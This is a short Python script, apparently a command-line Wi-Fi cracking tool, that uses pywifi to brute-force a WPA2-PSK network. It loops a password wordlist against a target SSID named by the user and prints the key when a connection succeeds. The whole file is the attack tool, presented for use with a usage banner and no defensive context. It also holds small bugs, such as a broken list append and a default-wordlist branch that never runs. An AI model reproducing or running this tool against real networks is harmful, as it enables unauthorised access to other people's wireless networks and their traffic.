import time
# import pywifi
# from pywifi import const
import sys

try:
    from colorama import init , Fore
    import pywifi
    from pywifi import const

except:
    print('[ E ] install librarys |Pywifi| and |Colorama|')
    exit()


init()

print(Fore.WHITE)


__ssids = []
dpassw  = open('Top+1000Number(099).txt','+r').read().split('\n')
wifi    = pywifi.PyWiFi()
iface   = wifi.interfaces()[0]


iface.disconnect()
time.sleep(1)

assert iface.status() in\
    [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]

def myinface():
    print(f'[{Fore.YELLOW} #{Fore.WHITE} ] Your {Fore.YELLOW}Interface{Fore.WHITE} System --> {iface.name()}')

def scan():
    
    iface.scan()
    time.sleep(1)
    ssids = iface.scan_results()
    for _ssids in ssids:
        __ssids.append = (_ssids.ssid)


def crack(ssid,passw):
    _rng   = 0
    print(f'[{Fore.YELLOW} #{Fore.WHITE} ] Your {Fore.YELLOW}Interface{Fore.WHITE} System --> {iface.name()}')
    for pas in passw:
        profile = pywifi.Profile()
        profile.ssid = ssid
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher = const.CIPHER_TYPE_CCMP
        profile.key = pas
        
        iface.remove_all_network_profiles()
        tmp_profile = iface.add_network_profile(profile)
        iface.connect(tmp_profile)
        time.sleep(0.99)
        if iface.status() == const.IFACE_CONNECTED:

            print(f'\n[{Fore.GREEN} + {Fore.WHITE}] Password {Fore.GREEN}Cracked{Fore.WHITE}')
            print(f'[{Fore.BLUE} * {Fore.WHITE}] Ssid       --> {Fore.BLUE}{ssid}{Fore.WHITE}')
            print(f'[{Fore.BLUE} * {Fore.WHITE}] Pswword    --> {Fore.BLUE}{pas}{Fore.WHITE}')
            break
        else:
            _rng += 1
            print(f'[{Fore.RED} - {Fore.WHITE}] Password{Fore.RED} Not {Fore.WHITE}Find ' + str(_rng) , end='\r')

def banner(): 
    print('''
--inf   : show inter face system
--help  : help run script
-s      : your ssid target
-p      : your password list file

example :
          
          python wp.py -s "your ssid target" -p "your password list file"
''')

try:
    sys.argv[1]
except:
    banner()

if sys.argv[1] == '--inf':
    myinface()
elif sys.argv[1] == '-s':
    if sys.argv[4] == '':
        p = dpassw
    else:

        try:
            p = open(sys.argv[4] , '+r').read().split('\n')
            crack(ssid=str(sys.argv[2]),passw=p)
        except:
            print('[ E ] error your file (file not found)')

    
iface.disconnect()
time.sleep(1)
assert iface.status() in\
    [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]